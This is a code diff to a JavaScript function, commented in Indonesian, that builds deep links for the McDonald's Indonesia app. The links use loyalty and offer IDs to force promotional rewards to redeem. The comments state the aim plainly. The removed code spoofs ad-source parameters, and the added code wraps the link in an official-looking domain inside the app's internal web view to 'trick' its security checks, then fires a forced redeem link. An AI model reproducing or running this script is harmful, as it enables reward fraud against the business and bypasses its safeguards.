@@ -5,32 +5,26 @@ function gas() {
     
     if(!o || !l) return alert("Isi ID!"); 
 
-    // TEKNIK BYPASS TERBARU:
-    // Kita tambahkan parameter 'site_id' dan 'creative_id' 
-    // agar aplikasi menganggap klik ini berasal dari iklan resmi.
-    var params = "offer_id=" + o + 
-                 "&loyalty_id=" + l + 
-                 "&view=claim" + 
-                 "&action=redeem" + 
-                 "&is_native=true" + 
-                 "&is_mass_code=1" +
-                 "&site_id=Tiktok_Promo" + 
-                 "&creative_id=Direct_Inject";
+    // 1. Susun Parameter Injeksi
+    var payload = "offer_id=" + o + 
+                  "&loyalty_id=" + l + 
+                  "&view=claim" + 
+                  "&action=redeem" + 
+                  "&is_mass_code=1" + 
+                  "&is_native=true";
 
-    // EKSEKUSI 1: Jalur Offers
-    var target1 = "gmalite://offers/details?" + params;
-    window.location.href = target1; 
+    // 2. TEKNIK PROXY MUKIDI:
+    // Kita pancing aplikasi dengan domain mcdonalds.co.id 
+    // agar sistem keamanan (Smartweb) mengizinkan eksekusi link.
+    var gateway = "https://www.mcdonalds.co.id/promo/details?" + payload;
 
-    // EKSEKUSI 2: Jalur Rewards (Pancingan jika jalur 1 diam)
+    // 3. Eksekusi melalui Smartweb Internal
+    // Ini akan menipu aplikasi seolah-olah kamu sedang membuka promo resmi
+    window.location.href = "gmalite://gmalite-smartweb?weburl=" + encodeURIComponent(gateway);
+
+    // 4. Force Trigger (Pemicu Paksa)
     setTimeout(function() {
-        var target2 = "gmalite://rewards/details?" + params;
-        window.location.href = target2;
-    }, 400);
-
-    // EKSEKUSI 3: Jalur Force Redeem (Jika masih diam)
-    setTimeout(function() {
-        var target3 = "gmalite://offers/redeem?" + params;
-        window.location.href = target3;
-    }, 800);
+        window.location.href = "gmalite://offers/details?" + payload;
+    }, 500);
 }
 </script>
